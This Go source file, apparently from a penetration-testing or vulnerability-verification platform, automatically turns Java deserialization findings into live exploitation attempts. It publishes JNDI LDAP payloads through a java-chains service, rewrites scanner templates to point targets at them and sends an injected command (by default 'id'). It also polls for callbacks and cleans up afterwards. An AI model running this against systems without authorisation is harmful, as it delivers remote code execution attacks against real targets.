package server

import (
	"context"
	"fmt"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/scanner"
)

// javaChainAttempt tracks one automatically published chain and its delivery.
type javaChainAttempt struct {
	tpl       db.POCTemplate
	preset    scanner.JavaChainsPreset
	jndi      *scanner.JavaChainsJNDI
	token     string
	ldap      string
	raw       string
	resp      scanner.DeepResponse
	confirmed bool
	callback  string
}

// runJavaChains auto-invokes the java-chains sidecar for Java deserialization
// POCs: it picks a preset from the template family, publishes a JNDI payload,
// rewrites the template's OAST address and delivers the request. It returns the
// templates whose callback was observed so the nuclei replay does not mark them
// as not reproduced. Everything it starts is stopped again before returning.
func (r *deepRun) runJavaChains(templates []db.POCTemplate, target, mode string, summary map[string]any) map[string]bool {
	if strings.EqualFold(stringParam(r.task.Params, "java_chains"), "off") {
		return nil
	}
	cfg := scanner.JavaChainsConfigFromEnv()
	type candidate struct {
		tpl    db.POCTemplate
		family string
	}
	var candidates []candidate
	for _, tpl := range templates {
		if strings.TrimSpace(tpl.Content) == "" || tpl.Protocol == "workflow" {
			continue
		}
		family := scanner.JavaDeserializationKeyword(tpl.TemplateID, tpl.Name, tpl.Tags, tpl.Content)
		if family == "" {
			continue
		}
		candidates = append(candidates, candidate{tpl: tpl, family: family})
	}
	if len(candidates) == 0 {
		return nil
	}
	if !cfg.Configured() {
		summary["java_chains_note"] = "检测到 Java 反序列化 POC，但未配置 JAVA_CHAINS_MCP_TOKEN"
		r.logf(mode, "检测到 %d 个 Java 反序列化 POC，java-chains 未配置，跳过自动利用", len(candidates))
		return nil
	}
	client := scanner.NewJavaChainsClient(cfg, 20*time.Second)
	statusCtx, cancel := context.WithTimeout(r.ctx, 5*time.Second)
	statusErr := client.JavaChainsStatus(statusCtx)
	cancel()
	if statusErr != nil {
		summary["java_chains_note"] = "java-chains 不可用: " + statusErr.Error()
		r.logf(mode, "检测到 %d 个 Java 反序列化 POC，但 java-chains 不可用：%v", len(candidates), statusErr)
		return nil
	}
	if len(candidates) > 5 {
		r.logf(mode, "Java 反序列化 POC 共 %d 个，仅对前 5 个自动调用 java-chains", len(candidates))
		candidates = candidates[:5]
	}
	r.logf(mode, "检测到 %d 个 Java 反序列化 POC，自动调用 java-chains", len(candidates))

	targetParts, err := scanner.ParseRawTarget(target)
	if err != nil {
		summary["java_chains_note"] = "目标地址无效"
		return nil
	}
	cmd := stringParam(r.task.Params, "java_cmd")
	if strings.TrimSpace(cmd) == "" {
		cmd = "id"
	}
	bindHost := stringParam(r.task.Params, "java_bind_host")
	if bindHost == "" {
		bindHost = cfg.BindHost
	}
	callbackHost := stringParam(r.task.Params, "java_callback_host")
	if callbackHost == "" {
		callbackHost = cfg.CallbackHost
	}
	wait := intParam(r.task.Params, "java_chains_wait", 12)
	if wait < 3 {
		wait = 3
	}
	if wait > 30 {
		wait = 30
	}
	if isLoopbackHost(callbackHost) && !isLoopbackHost(targetParts.Hostname) {
		r.logf(mode, "java-chains 回调地址 %s 是回环地址，远端目标可能无法回连；请设置 JAVA_CHAINS_CALLBACK_HOST 或 java_callback_host", callbackHost)
	}

	httpClient := scanner.NewDeepClient(15 * time.Second)
	var attempts []*javaChainAttempt
	var startedJobs []string
	var resourceIDs []int64
	generated := 0
	confirmedTemplates := map[string]bool{}
	skipped := 0

	for _, cd := range candidates {
		if r.ctx.Err() != nil {
			break
		}
		callCtx, callCancel := context.WithTimeout(r.ctx, 30*time.Second)
		presets, err := client.SearchPresets(callCtx, cd.family, 8)
		if err != nil || len(presets) == 0 {
			callCancel()
			skipped++
			r.logf(mode, "%s：未找到 java-chains 预设（%v）", cd.tpl.TemplateID, err)
			continue
		}

		raws := scanner.ExtractRawHTTPRequests(cd.tpl.Content)
		canDeliver := scanner.HasInteractshJNDI(raws)
		if !canDeliver {
			r.logf(mode, "%s：模板不含 {{interactsh-url}} JNDI 地址，改为生成 payload 取证", cd.tpl.TemplateID)
		}
		delivered := false
		generatedOK := false
		var lastErr error
		tried := 0
		for _, preset := range orderedJavaChainsPresets(presets) {
			if tried >= 3 || delivered || generatedOK {
				break
			}
			tried++
			inputs, inputErr := javaChainInputs(preset, cmd)
			if inputErr != nil {
				lastErr = inputErr
				continue
			}
			if payload := javaChainJNDIPayload(preset); canDeliver && payload != "" {
				jndi, qerr := client.QuickJNDI(callCtx, preset.ID, payload, inputs, bindHost, callbackHost)
				if qerr != nil {
					lastErr = qerr
					r.logf(mode, "%s：预设 %s 发布失败：%v", cd.tpl.TemplateID, preset.ID, qerr)
					continue
				}
				startedJobs = append(startedJobs, jndi.TaskID)
				if id := r.trackJNDIResource(target, cd.tpl, preset, jndi); id > 0 {
					resourceIDs = append(resourceIDs, id)
				}
				rewritten, ok := scanner.RewriteJNDIRequests(raws, jndi.Formats.LDAP, targetParts)
				if !ok {
					lastErr = fmt.Errorf("模板无可替换的 JNDI 地址")
					continue
				}
				att := &javaChainAttempt{
					tpl:    cd.tpl,
					preset: preset,
					jndi:   jndi,
					token:  jndi.Formats.Token,
					ldap:   jndi.Formats.LDAP,
				}
				if att.token == "" {
					att.token = tokenFromLDAPURL(jndi.Formats.LDAP)
				}
				for i, raw := range rewritten {
					if i >= 2 {
						break
					}
					req, berr := scanner.BuildRawRequest(raw, targetParts)
					if berr != nil {
						r.logf(mode, "%s：构造请求失败：%v", cd.tpl.TemplateID, berr)
						continue
					}
					resp := httpClient.Do(r.ctx, req)
					att.raw, att.resp = raw, resp
					if resp.Error == "" {
						break
					}
				}
				attempts = append(attempts, att)
				r.logf(mode, "%s：已投递 java-chains JNDI payload（预设 %s，%s）", cd.tpl.TemplateID, preset.ID, jndi.Formats.LDAP)
				delivered = att.raw != ""
				if delivered {
					break
				}
			}

			gen, gerr := client.QuickGenerate(callCtx, preset.ID, javaChainPresetPayload(preset), inputs)
			if gerr != nil {
				lastErr = gerr
				r.logf(mode, "%s：预设 %s 生成失败：%v", cd.tpl.TemplateID, preset.ID, gerr)
				continue
			}
			generated++
			generatedOK = true
			_, _ = r.pg.AddExploitRecord(db.ExploitRecord{
				TaskID:     r.task.ID,
				Mode:       "java_chains",
				TemplateID: cd.tpl.TemplateID,
				Name:       displayOr(cd.tpl.Name, cd.tpl.TemplateID) + " · java-chains",
				Severity:   strings.ToLower(cd.tpl.Severity),
				Target:     target,
				Verdict:    "payload_generated",
				Evidence: fmt.Sprintf("java-chains 预设 %s 已生成 payload（%s，%d 字节，sha256 %s），但未能自动投递（无 JNDI 注入点或投递失败）。",
					preset.ID, gen.Output.Artifact.Filename, gen.Output.Artifact.SizeBytes, gen.Output.Artifact.SHA256),
			})
			cleanupCtx, cleanupCancel := context.WithTimeout(context.Background(), 8*time.Second)
			_ = client.DeleteArtifact(cleanupCtx, gen.Output.Artifact.ArtifactID)
			cleanupCancel()
			break
		}
		if !delivered && !generatedOK {
			skipped++
			r.logf(mode, "%s：java-chains 未找到可用预设：%v", cd.tpl.TemplateID, lastErr)
		}
		callCancel()
	}

	// Wait for a callback from any target that consumed the JNDI reference.
	if len(attempts) > 0 {
		deadline := time.Now().Add(time.Duration(wait) * time.Second)
		for {
			pending := false
			for _, a := range attempts {
				if !a.confirmed {
					pending = true
				}
			}
			if !pending || time.Now().After(deadline) || r.ctx.Err() != nil {
				break
			}
			pollCtx, pollCancel := context.WithTimeout(r.ctx, 8*time.Second)
			logs, err := client.RuntimeLogs(pollCtx, 0, 500)
			pollCancel()
			if err == nil {
				for _, a := range attempts {
					if a.confirmed || a.token == "" {
						continue
					}
					for _, line := range logs {
						if !strings.Contains(line.Message, a.token) {
							continue
						}
						if strings.Contains(line.Message, "outcome=serve") || strings.Contains(line.Message, "outcome=lookup") {
							a.confirmed = true
							a.callback = line.Message
							break
						}
					}
				}
			}
			select {
			case <-r.ctx.Done():
			case <-time.After(time.Second):
			}
		}
	}

	confirmedCount := 0
	for _, a := range attempts {
		verdict := "attempted"
		evidence := fmt.Sprintf("java-chains 预设 %s；LDAP 发布 %s；已向目标投递 JNDI 引用。", a.preset.ID, a.ldap)
		if a.confirmed {
			verdict = "confirmed"
			confirmedCount++
			confirmedTemplates[a.tpl.TemplateID] = true
			evidence += "\n回调确认：" + a.callback
		} else {
			evidence += fmt.Sprintf("\n%d 秒内未观察到目标回连；请检查回调地址可达性、JDK 版本与出网限制。", wait)
		}
		if a.resp.Error != "" {
			evidence += "\n投递错误：" + a.resp.Error
		} else {
			evidence += fmt.Sprintf("\n投递响应：HTTP %d，%d 字节", a.resp.StatusCode, a.resp.Length)
		}
		rec := db.ExploitRecord{
			TaskID:     r.task.ID,
			Mode:       "java_chains",
			TemplateID: a.tpl.TemplateID,
			Name:       displayOr(a.tpl.Name, a.tpl.TemplateID) + " · java-chains",
			Severity:   strings.ToLower(a.tpl.Severity),
			Target:     target,
			Verdict:    verdict,
			Request:    cleanHTTPText(a.raw, maxStoredHTTPRequest),
			Response:   cleanHTTPText(rawHTTPResponse(a.resp), maxStoredHTTPResponse),
			Evidence:   evidence,
		}
		if a.resp.StatusCode > 0 {
			code := a.resp.StatusCode
			rec.StatusCode = &code
		}
		if _, err := r.pg.AddExploitRecord(rec); err != nil {
			r.logf(mode, "写入 java-chains 记录失败 %s: %v", a.tpl.TemplateID, err)
		}
		if a.confirmed {
			note := fmt.Sprintf("自动复现确认：深度任务 #%d 通过 java-chains 回连确认模板 %s（预设 %s）。",
				r.task.ID, a.tpl.TemplateID, a.preset.ID)
			if linked := r.confirmLinkedFindings(mode, a.tpl.TemplateID, note); linked == 0 &&
				mode == "exploit" && boolParam(r.task.Params, "write_finding") {
				r.writeFinding(rec)
			}
		}
	}

	// Clean up every publication and the JNDI service unless someone else holds it.
	cleanupCtx, cleanupCancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cleanupCancel()
	for _, job := range startedJobs {
		if err := client.DeleteJob(cleanupCtx, job); err != nil {
			r.logf(mode, "清理 java-chains 任务 %s 失败：%v", job, err)
		}
	}
	if len(startedJobs) > 0 {
		if active, err := client.ActiveJNDIPublications(cleanupCtx); err == nil {
			if active == 0 {
				if err := client.StopJNDI(cleanupCtx); err != nil {
					r.logf(mode, "停止 java-chains JNDI 服务失败：%v", err)
				} else {
					r.logf(mode, "java-chains JNDI 服务已停止")
				}
			} else {
				r.logf(mode, "java-chains 仍有 %d 个 JNDI 发布在使用，保留服务", active)
			}
		}
	}
	// The publication is gone and the service was stopped above, so the ledger
	// entry can be closed. If this process dies first, the TTL reaper expires it.
	for _, id := range uniqueIDs(resourceIDs) {
		if _, _, err := r.pg.ReleaseManagedResource(id, "java-chains 自动任务结束"); err != nil {
			r.logf(mode, "释放回调资源 #%d 失败：%v", id, err)
		}
	}

	summary["java_chains_used"] = len(attempts)
	summary["java_chains_confirmed"] = confirmedCount
	summary["java_chains_generated"] = generated
	if skipped > 0 {
		summary["java_chains_skipped"] = skipped
	}
	if len(attempts) == 0 && generated == 0 {
		summary["java_chains_note"] = "未找到可用的 java-chains 预设或投递点"
	}
	r.logf(mode, "java-chains 完成：投递 %d 个，回调确认 %d 个，仅生成 %d 个", len(attempts), confirmedCount, generated)
	return confirmedTemplates
}

func pickJavaChainsPreset(presets []scanner.JavaChainsPreset) scanner.JavaChainsPreset {
	return orderedJavaChainsPresets(presets)[0]
}

// orderedJavaChainsPresets ranks delivery-capable presets first so a broken
// preset (e.g. a missing gadget) can fall through to the next candidate.
func orderedJavaChainsPresets(presets []scanner.JavaChainsPreset) []scanner.JavaChainsPreset {
	out := append([]scanner.JavaChainsPreset(nil), presets...)
	sort.SliceStable(out, func(i, j int) bool {
		return javaChainsPresetRank(out[i]) < javaChainsPresetRank(out[j])
	})
	return out
}

func javaChainsPresetRank(p scanner.JavaChainsPreset) int {
	switch p.Intent {
	case "outbound-jndi":
		return 0
	case "command-exec":
		return 1
	default:
		return 2
	}
}

func javaChainJNDIPayload(preset scanner.JavaChainsPreset) string {
	for _, c := range preset.PayloadCandidates {
		if c == "JNDILDAPDeserializePayload" {
			return c
		}
	}
	return ""
}

// javaChainPresetPayload returns the preset's leading payload, which matches
// the first gadget in its canonical chain. Picking a later candidate (e.g.
// ShiroPayload on a C3P0 chain) makes quick_generate fail.
func javaChainPresetPayload(preset scanner.JavaChainsPreset) string {
	if len(preset.PayloadCandidates) > 0 {
		return preset.PayloadCandidates[0]
	}
	return "JavaNativePayload"
}

func javaChainInputs(preset scanner.JavaChainsPreset, cmd string) (map[string]any, error) {
	inputs := map[string]any{}
	for _, in := range preset.RequiredInputs {
		switch in.Key {
		case "cmd":
			inputs["cmd"] = cmd
		case "":
		default:
			return nil, fmt.Errorf("%s", in.Key)
		}
	}
	return inputs, nil
}

// trackJNDIResource records the published JNDI endpoint in the managed-resource
// ledger with a TTL slightly longer than the deep-task timeout. A crash before
// the normal release then still gets the port audited/closed by the reaper.
func (r *deepRun) trackJNDIResource(target string, tpl db.POCTemplate, preset scanner.JavaChainsPreset, jndi *scanner.JavaChainsJNDI) int64 {
	if r.s == nil || r.s.resourceMgr == nil || jndi == nil {
		return 0
	}
	endpoint := endpointFromURL(jndi.Formats.LDAP)
	if endpoint == "" {
		return 0
	}
	taskID := r.task.ID
	res, err := r.s.resourceMgr.register(db.ManagedResourceInput{
		Kind:      db.ManagedKindCallback,
		Name:      "java-chains JNDI · " + displayOr(preset.ID, tpl.TemplateID),
		Endpoint:  endpoint,
		Target:    target,
		Owner:     fmt.Sprintf("deep:%d", taskID),
		TaskID:    &taskID,
		ExpiresAt: ptrTime(time.Now().Add(20 * time.Minute)),
		Metadata: map[string]any{
			"service":  "jndi",
			"preset":   preset.ID,
			"template": tpl.TemplateID,
			"job_id":   jndi.TaskID,
			"ldap":     jndi.Formats.LDAP,
		},
		Note: "java-chains 回调端口",
	}, nil)
	if err != nil {
		r.logf("java_chains", "登记回调资源 %s 失败：%v", endpoint, err)
		return 0
	}
	r.logf("java_chains", "回调端口 %s 已登记为受管资源 #%d（TTL 20m）", endpoint, res.ID)
	return res.ID
}

func endpointFromURL(raw string) string {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || u.Host == "" {
		return ""
	}
	return u.Host
}

func tokenFromLDAPURL(ldapURL string) string {
	u, err := url.Parse(strings.TrimSpace(ldapURL))
	if err != nil || u.Host == "" {
		return ""
	}
	return strings.Trim(u.Path, "/")
}

func isLoopbackHost(host string) bool {
	switch strings.ToLower(strings.TrimSpace(host)) {
	case "127.0.0.1", "localhost", "::1", "[::1]":
		return true
	}
	return false
}
